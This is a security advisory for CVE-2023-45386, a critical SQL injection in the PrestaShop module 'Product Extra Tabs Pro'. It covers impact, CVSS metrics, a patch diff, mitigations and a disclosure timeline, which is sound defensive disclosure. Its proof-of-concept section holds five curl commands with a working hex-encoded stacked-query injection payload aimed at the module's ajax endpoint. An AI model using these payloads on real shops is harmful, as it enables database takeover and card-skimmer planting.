---
layout: post
title: "[CVE-2023-45386] Improper neutralization of SQL parameter in MyPresta.eu - Product Extra Tabs Pro for PrestaShop"
categories: modules
author:
- TouchWeb.fr
- 202 Ecommerce
- Friends-Of-Presta.org
meta: "CVE,PrestaShop,extratabspro"
severity: "critical (9.8)"
---

In the module "Product Extra Tabs Pro" (extratabspro) up to version 2.2.8 from MyPresta.eu for PrestaShop, a guest can perform SQL injection in affected versions.


## Summary

* **CVE ID**: [CVE-2023-45386](https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2023-45386)
* **Published at**: 2023-10-12
* **Platform**: PrestaShop
* **Product**: extratabspro
* **Impacted release**: <= 2.2.7 (2.2.8 fixed the vulnerability)
* **Product author**: MyPresta.eu
* **Weakness**: [CWE-89](https://cwe.mitre.org/data/definitions/89.html)
* **Severity**: critical (9.8)

## Description

Methods `extratabspro::searchcategory()`, `extratabspro::searchproduct()` and `extratabspro::searchmanufacturer()` has sensitive SQL calls that can be executed with a trivial http call and exploited to forge a SQL injection.

The exploit can be used even if the module is not activated.

**WARNING** : This exploit is actively used to deploy a webskimmer to massively steal credit cards.

## CVSS base metrics

* **Attack vector**: network
* **Attack complexity**: low
* **Privilege required**: none
* **User interaction**: none
* **Scope**: unchanged
* **Confidentiality**: high
* **Integrity**: high
* **Availability**: high

**Vector string**: [CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:H/A:H](https://nvd.nist.gov/vuln-metrics/cvss/v3-calculator?vector=AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:H/A:H)

## Possible malicious usage

* Obtain admin access
* Remove data from the associated PrestaShop
* Copy/paste data from sensitive tables to FRONT to expose tokens and unlock admins's ajax scripts
* Rewrite SMTP settings to hijack emails


## Proof of concept


```bash
curl -v -X POST -d 'search_feature=1";select(0x73656C65637420736C656570283432293B)INTO@a;prepare`b`from@a;execute`b`;--' 'https://preprod.X/modules/extratabspro/ajax_extratabspro.php'
curl -v -X POST -d 'searchsupplier=1";select(0x73656C65637420736C656570283432293B)INTO@a;prepare`b`from@a;execute`b`;--' 'https://preprod.X/modules/extratabspro/ajax_extratabspro.php'
curl -v -X POST -d 'search=1";select(0x73656C65637420736C656570283432293B)INTO@a;prepare`b`from@a;execute`b`;--' 'https://preprod.X/modules/extratabspro/ajax_extratabspro.php'
curl -v -X POST -d 'search_product=1";select(0x73656C65637420736C656570283432293B)INTO@a;prepare`b`from@a;execute`b`;--' 'https://preprod.X/modules/extratabspro/ajax_extratabspro.php'
curl -v -X POST -d 'search_manufacturer=1";select(0x73656C65637420736C656570283432293B)INTO@a;prepare`b`from@a;execute`b`;--' 'https://preprod.X/modules/extratabspro/ajax_extratabspro.php'
```

## Patch from 2.2.7

```diff
--- 2.2.7/extratabspro/extratabspro.php
+++ 2.2.8/extratabspro/extratabspro.php
...
public function searchsupplier($search)
    {
-       return Db::getInstance()->ExecuteS('SELECT `id_supplier`,`name` FROM `' . _DB_PREFIX_ . 'supplier` WHERE `name` like "%' . $search . '%" LIMIT 10');
+       return Db::getInstance()->ExecuteS('SELECT `id_supplier`,`name` FROM `' . _DB_PREFIX_ . 'supplier` WHERE `name` like "%' . pSQL($search) . '%" LIMIT 10');
    }

    public function getSuppliers($id)
    {
-       return Db::getInstance()->ExecuteS('SELECT `id_supplier` FROM `' . _DB_PREFIX_ . 'product_supplier` WHERE `id_product`= ' . $id . ' GROUP BY id_supplier');
+       return Db::getInstance()->ExecuteS('SELECT `id_supplier` FROM `' . _DB_PREFIX_ . 'product_supplier` WHERE `id_product`= ' . (int) $id . ' GROUP BY id_supplier');
    }

    public function searchfeature($search)
    {
-       return Db::getInstance()->ExecuteS('SELECT `id_feature_value`,`value` as name FROM `' . _DB_PREFIX_ . 'feature_value_lang` WHERE `value` like "%' . (string )$search . '%" AND id_lang="' . Configuration::get('PS_LANG_DEFAULT') . '" LIMIT 10');
+       return Db::getInstance()->ExecuteS('SELECT `id_feature_value`,`value` as name FROM `' . _DB_PREFIX_ . 'feature_value_lang` WHERE `value` like "%' . pSQL($search) . '%" AND id_lang="' . Configuration::get('PS_LANG_DEFAULT') . '" LIMIT 10');
    }

    public function searchcategory($search)
    {
-       return Db::getInstance()->ExecuteS('SELECT `id_category`,`name` FROM `' . _DB_PREFIX_ . 'category_lang` WHERE `name` like "%' . $search . '%" AND id_lang="' . Configuration::get('PS_LANG_DEFAULT') . '" AND id_shop="' . $this->context->shop->id . '" LIMIT 10');
+       return Db::getInstance()->ExecuteS('SELECT `id_category`,`name` FROM `' . _DB_PREFIX_ . 'category_lang` WHERE `name` like "%' . pSQL($search) . '%" AND id_lang="' . Configuration::get('PS_LANG_DEFAULT') . '" AND id_shop="' . $this->context->shop->id . '" LIMIT 10');
    }

    public function searchproduct($search)
    {
-       return Db::getInstance()->ExecuteS('SELECT `id_product`,`name` FROM `' . _DB_PREFIX_ . 'product_lang` WHERE `name` like "%' . $search . '%" AND id_lang="' . Configuration::get('PS_LANG_DEFAULT') . '" AND id_shop="' . $this->context->shop->id . '" LIMIT 10');
+       return Db::getInstance()->ExecuteS('SELECT `id_product`,`name` FROM `' . _DB_PREFIX_ . 'product_lang` WHERE `name` like "%' . pSQL($search) . '%" AND id_lang="' . Configuration::get('PS_LANG_DEFAULT') . '" AND id_shop="' . $this->context->shop->id . '" LIMIT 10');
    }

    public function searchmanufacturer($search)
    {
-       return Db::getInstance()->ExecuteS('SELECT m.`id_manufacturer`,m.`name` FROM `' . _DB_PREFIX_ . 'manufacturer` m LEFT JOIN `' . _DB_PREFIX_ . 'manufacturer_shop` ms ON ms.id_manufacturer = m.id_manufacturer WHERE `name` like "%' . $search . '%" AND ms.id_shop="' . $this->context->shop->id . '" LIMIT 10');
+       return Db::getInstance()->ExecuteS('SELECT m.`id_manufacturer`,m.`name` FROM `' . _DB_PREFIX_ . 'manufacturer` m LEFT JOIN `' . _DB_PREFIX_ . 'manufacturer_shop` ms ON ms.id_manufacturer = m.id_manufacturer WHERE `name` like "%' . pSQL($search) . '%" AND ms.id_shop="' . $this->context->shop->id . '" LIMIT 10');
    }
```

## Other recommendations

* It’s recommended to upgrade to the latest version of the module **extratabspro**.
* Upgrade PrestaShop to the latest version to disable multiquery executions (separated by “;”) - be warned that this functionality **WILL NOT** protect your SHOP against injection SQL which uses the UNION clause to steal data.
* Change the default database prefix `ps_` with a new longer, arbitrary prefix. Nevertheless, be warned that this is useless against blackhats with DBA senior skill because of a design vulnerability in DBMS
* Activate OWASP 942's rules on your WAF (Web application firewall), be warned that you will probably break your backoffice and you will need to pre-configure some bypasses against this set of rules.

## Timeline

| Date | Action |
|--|--|
| 2023-04-27 | Issue discovered during a code review by [TouchWeb.fr](https://www.touchweb.fr) |
| 2023-04-28 | Contact Author to confirm version scope |
| 2023-04-28 | Request a CVE ID |
| 2023-05-23 | Author confirm version scope |
| 2023-05-23 | Recontact author to get fixed version of the module to confirm fix |
| 2023-09-26 | Relaunch author to get fixed version of the module to confirm fix |
| 2023-09-26 | Author give the archive of the fix version of the module - fix confirmed |
| 2023-10-11 | Received CVE ID |
| 2023-10-12 | Publish this security advisory |

## Links

* [Author product page](https://mypresta.eu/modules/front-office-features/product-extra-tabs-pro.html)
* [National Vulnerability Database](https://nvd.nist.gov/vuln/detail/CVE-2023-45386)
